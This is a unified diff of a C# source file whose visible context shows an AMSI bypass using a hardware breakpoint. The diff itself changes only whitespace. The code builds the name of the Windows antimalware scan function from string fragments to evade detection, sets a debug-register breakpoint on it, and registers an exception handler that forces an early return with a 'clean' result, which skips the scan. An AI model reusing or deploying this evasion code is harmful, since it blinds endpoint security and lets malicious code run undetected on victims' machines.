@@ -18,7 +18,7 @@ namespace HWBP
         static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + a + ".dll");
         static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + a + "Sc" + b + "u" + c + "er");
         static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));
-        
+
         public static void Bypass()
         {
             WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64();
@@ -26,7 +26,7 @@ namespace HWBP
 
             MethodInfo method = typeof(Amsi).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
             IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
-            
+
             Marshal.StructureToPtr(ctx, pCtx, true);
             bool b = WinAPI.GetThreadContext((IntPtr)(-2), pCtx);
             ctx = (WinAPI.CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(WinAPI.CONTEXT64));
@@ -34,7 +34,7 @@ namespace HWBP
             EnableBreakpoint(ctx, pABuF, 0);
             WinAPI.SetThreadContext((IntPtr)(-2), pCtx);
         }
-        
+
         public static long Handler(IntPtr exceptions)
         {
             WinAPI.EXCEPTION_POINTERS ep = new WinAPI.EXCEPTION_POINTERS();
@@ -57,7 +57,7 @@ namespace HWBP
                 ContextRecord.Rip = ReturnAddress;
                 ContextRecord.Rsp += 8;
                 ContextRecord.Rax = 0; // S_OK
-                
+
                 Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true); //Paste our altered ctx back in TO THE RIGHT STRUCT
                 return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
             }
